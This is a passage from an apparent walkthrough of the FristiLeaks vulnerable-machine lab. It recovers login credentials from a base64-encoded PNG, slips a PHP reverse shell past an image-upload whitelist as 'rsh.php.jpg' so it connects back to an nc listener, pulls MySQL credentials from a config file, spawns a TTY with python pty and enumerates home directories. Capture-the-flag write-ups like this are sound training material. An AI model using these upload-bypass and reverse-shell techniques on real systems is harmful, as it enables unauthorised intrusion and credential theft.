</span><span class='line'><span class="c">iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU 12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5 uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1 04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws 30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl 3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34 rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR U5ErkJggg==</span>
</span><span class='line'><span class="c">--&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><font color="red">[note!!]</font> before decoding, we have to remove newlines from each line, <code>tr</code> can be used to fix that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# cat test.txt
</span><span class='line'>
</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
</span><span class='line'>jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
</span><span class='line'>S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
</span><span class='line'>B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
</span><span class='line'>m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
</span><span class='line'>Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
</span><span class='line'>DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
</span><span class='line'>jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
</span><span class='line'>12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
</span><span class='line'>uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
</span><span class='line'>04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
</span><span class='line'>i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
</span><span class='line'>tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
</span><span class='line'>30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
</span><span class='line'>3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
</span><span class='line'>ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
</span><span class='line'>mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
</span><span class='line'>rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
</span><span class='line'>EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
</span><span class='line'>AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
</span><span class='line'>CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
</span><span class='line'><span class="nv">U5ErkJggg</span><span class="o">==</span>
</span><span class='line'>root@kali:~/fristileaks# tr -d <span class="s1">&#39;\n&#39;</span> &lt; test.txt &gt; base64_decoded.txt
</span><span class='line'>root@kali:~/fristileaks# cat base64_decoded.txt
</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg<span class="o">==</span>
</span></code></pre></td></tr></table></div></figure>


<p>After decoded this, I got a PNG file:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/3.png"></p>

<p>In terms of all the information we collected from this page/source code, I can guess the username is <font color="red"><code>eezeepz</code></font> and the password is <font color="red"><code>keKkeKKeKKeKkEkkEk</code></font>.</p>

<p>After login, I got a link to allow us upload file!</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/4.png"></p>

<p>But when I trying to upload <code>.php</code> webshell, I got the following error, only <code>png</code>, <code>jpg</code> and <code>gif</code> are allowed.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/5.png"></p>

<p>In order to bypass the whitelist verification, I added <code>.jpg</code> at the end of the web shell&rsquo;s file name to make it looks like <code>rsh.php.jpg</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/6.png"></p>

<p><code>rsh.php</code> is a reverse PHP shell which will connect back to my Kali&rsquo;s tcp port <code>5555</code>, so before I upload and trigger the shell, I setup <code>nc</code> to listen on port <code>5555</code>.</p>

<p>Ok, after uploaded the reverse PHP shell, I can now visit it from uploads folder, the url is <code>http://10.1.1.150/fristi/uploads/rsh.php.jpg</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/7.png"></p>

<p>Bingo! I got a shell now.</p>

<p>After enumeration I found Database sensitive information stored in the file <code>/var/www/html/fristi/checklogin.php</code>, user name <font color="red"><code>eezeepz</code></font> and the password is <font color="red"><code>4ll3maal12#</code></font></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">\</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="nb">ob_start</span><span class="p">();</span>
</span><span class='line'><span class="nv">$host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span> <span class="c1">// Host name</span>
</span><span class='line'><span class="nv">$username</span><span class="o">=</span><span class="s2">&quot;eezeepz&quot;</span><span class="p">;</span> <span class="c1">// Mysql username</span>
</span><span class='line'><span class="nv">$password</span><span class="o">=</span><span class="s2">&quot;4ll3maal12#&quot;</span><span class="p">;</span> <span class="c1">// Mysql password</span>
</span><span class='line'><span class="nv">$db_name</span><span class="o">=</span><span class="s2">&quot;hackmenow&quot;</span><span class="p">;</span> <span class="c1">// Database name</span>
</span><span class='line'><span class="nv">$tbl_name</span><span class="o">=</span><span class="s2">&quot;members&quot;</span><span class="p">;</span> <span class="c1">// Table name</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Connect to server and select databse.</span>
</span><span class='line'><span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$host</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$username</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$password</span><span class="s2">&quot;</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;cannot connect&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$db_name</span><span class="s2">&quot;</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;cannot select DB&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Define $myusername and $mypassword</span>
</span><span class='line'><span class="nv">$myusername</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;myusername&#39;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$mypassword</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mypassword&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span> <span class="nx">turncate</span> <span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first thing I thought was to login via SSH with the found username and password, but SSH is not running on the target server.</p>

<p>Then, I tried <code>su</code> command but it has too be called from a TTY session. by using the trick <font color="red"><code>python -c "import pty; pty.spawn('/bin/bash');"</code></font> to jail break, I can try <code>su</code> again with the login credential. But still failed, Damn, the password is wrong.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</span>
</span><span class='line'>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span>su eezeepz
</span><span class='line'>su eezeepz
</span><span class='line'>Password: 4ll3maal12#
</span><span class='line'>
</span><span class='line'>idsu: incorrect password
</span></code></pre></td></tr></table></div></figure>


<p>So I have to keep digging further, then I found a clue file <code>notes.txt</code> under the path <code>/var/www/</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/var/www
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>sh-4.1<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x.  <span class="m">6</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 13:50 .
</span><span class='line'>drwxr-xr-x. <span class="m">19</span> root root <span class="m">4096</span> Nov <span class="m">19</span> 01:41 ..
</span><span class='line'>drwxr-xr-x.  <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">24</span> 13:53 cgi-bin
</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 03:29 error
</span><span class='line'>drwxr-xr-x.  <span class="m">7</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 04:10 html
</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 03:37 icons
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root root   <span class="m">98</span> Nov <span class="m">17</span> 13:50 notes.txt
</span><span class='line'>sh-4.1<span class="nv">$ </span>cat notes.txt
</span><span class='line'>cat notes.txt
</span><span class='line'>hey eezeepz your homedir is a mess, go clean it up, just dont delete
</span><span class='line'>the important stuff.
</span><span class='line'>
</span><span class='line'>-jerry
</span><span class='line'>sh-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>In that file, jerry mentioned home directory about user <code>eezeepz</code>. by following this clue, I checked <code>/home</code> directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>sh-4.1$ cd /home
</span><span class='line'>cd /home
</span><span class='line'>sh-4.1$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x.  5 root      root       4096 Nov 19 01:40 .
</span><span class='line'>dr-xr-xr-x. 22 root      root       4096 Dec 27 17:50 ..
</span><span class='line'>drwx------.  2 admin     admin      4096 Nov 19 02:03 admin
</span><span class='line'>drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18 15:35 eezeepz
</span><span class='line'>drwx------   2 fristigod fristigod  4096 Nov 19 01:40 fristigod
</span><span class='line'>sh-4.1$
</span></code></pre></td></tr></table></div></figure>


<p>As we can see from above, home folder <code>eezeepz</code> has global read and execute permission for anyone.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 2608
</span><span class='line'>drwx---r-x. <span class="m">5</span> eezeepz eezeepz  <span class="m">12288</span> Nov <span class="m">18</span> 15:35 .
</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root    root      <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .Old
</span><span class='line'>-rw-r--r--. <span class="m">1</span> eezeepz eezeepz     <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
</span><span class='line'>-rw-r--r--. <span class="m">1</span> eezeepz eezeepz    <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
</span><span class='line'>-rw-r--r--. <span class="m">1</span> eezeepz eezeepz    <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .gnome
</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .settings
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">24376</span> Nov <span class="m">17</span> 09:49 MAKEDEV
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">33559</span> Nov <span class="m">17</span> 09:49 cbq
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">6976</span> Nov <span class="m">17</span> 09:49 cciss_id
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">56720</span> Nov <span class="m">17</span> 09:49 cfdisk
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">25072</span> Nov <span class="m">17</span> 09:49 chcpu
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">52936</span> Nov <span class="m">17</span> 09:48 chgrp
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">31800</span> Nov <span class="m">17</span> 09:49 chkconfig
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">48712</span> Nov <span class="m">17</span> 09:48 chmod
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">53640</span> Nov <span class="m">17</span> 09:48 chown
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">44528</span> Nov <span class="m">17</span> 09:49 clock
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">4808</span> Nov <span class="m">17</span> 09:49 consoletype
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">129992</span> Nov <span class="m">17</span> 09:48 cpio
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">38608</span> Nov <span class="m">17</span> 09:49 cryptsetup
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">5344</span> Nov <span class="m">17</span> 09:49 ctrlaltdel
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">41704</span> Nov <span class="m">17</span> 09:48 cut
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">14832</span> Nov <span class="m">17</span> 09:49 halt
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 hostname
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">44528</span> Nov <span class="m">17</span> 09:49 hwclock
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">7920</span> Nov <span class="m">17</span> 09:49 kbd_mode
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11576</span> Nov <span class="m">17</span> 09:49 <span class="nb">kill</span>
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">16472</span> Nov <span class="m">17</span> 09:49 killall5
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">32928</span> Nov <span class="m">17</span> 09:49 kpartx
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11464</span> Nov <span class="m">17</span> 09:49 nameif
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">171784</span> Nov <span class="m">17</span> 09:49 nano
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">5512</span> Nov <span class="m">17</span> 09:49 netreport
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">123360</span> Nov <span class="m">17</span> 09:49 netstat
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13892</span> Nov <span class="m">17</span> 09:49 new-kernel-pkg
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">25208</span> Nov <span class="m">17</span> 09:49 nice
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 nisdomainname
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">4736</span> Nov <span class="m">17</span> 09:49 nologin
</span><span class='line'>-r--r--r--. <span class="m">1</span> eezeepz eezeepz    <span class="m">514</span> Nov <span class="m">18</span> 14:53 notes.txt
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">390616</span> Nov <span class="m">17</span> 09:49 tar
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11352</span> Nov <span class="m">17</span> 09:49 taskset
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">249000</span> Nov <span class="m">17</span> 09:49 tc
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">51536</span> Nov <span class="m">17</span> 09:49 telinit
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">47928</span> Nov <span class="m">17</span> 09:49 touch
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11440</span> Nov <span class="m">17</span> 09:49 tracepath
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">12304</span> Nov <span class="m">17</span> 09:49 tracepath6
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">21112</span> Nov <span class="m">17</span> 09:49 <span class="nb">true</span>
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">35608</span> Nov <span class="m">17</span> 09:49 tune2fs
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">15410</span> Nov <span class="m">17</span> 09:49 weak-modules
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">12216</span> Nov <span class="m">17</span> 09:49 wipefs
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">504400</span> Nov <span class="m">17</span> 09:49 xfs_repair
